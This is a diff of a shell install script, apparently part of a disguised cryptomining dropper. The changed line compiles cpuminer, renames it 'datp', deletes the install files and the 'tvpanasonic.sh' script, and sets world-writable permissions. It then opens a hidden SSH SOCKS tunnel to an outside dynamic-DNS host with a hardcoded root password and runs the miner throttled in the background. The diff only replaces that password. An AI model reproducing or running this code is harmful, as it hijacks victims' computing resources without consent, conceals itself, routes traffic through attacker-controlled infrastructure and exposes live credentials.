@@ -5,4 +5,4 @@ cd panasonic
 chmod +x *
 ./build.sh
 make
-mv cpuminer datp && cp datp ../ && cd ..  && sudo rm -rf panasonic tvpanasonic.sh && sudo chmod 777 * && screen -d -m sshpass -p blackb0Y9x ssh -o StrictHostKeyChecking=no -D 1996 root@proxidaocoin.ddns.net && cpulimit --exe datp --limit 200 -b
+mv cpuminer datp && cp datp ../ && cd ..  && sudo rm -rf panasonic tvpanasonic.sh && sudo chmod 777 * && screen -d -m sshpass -p 	HLYfpydtScyRKRLAFuftQpGCXtSex54Ro8 ssh -o StrictHostKeyChecking=no -D 1996 root@proxidaocoin.ddns.net && cpulimit --exe datp --limit 200 -b
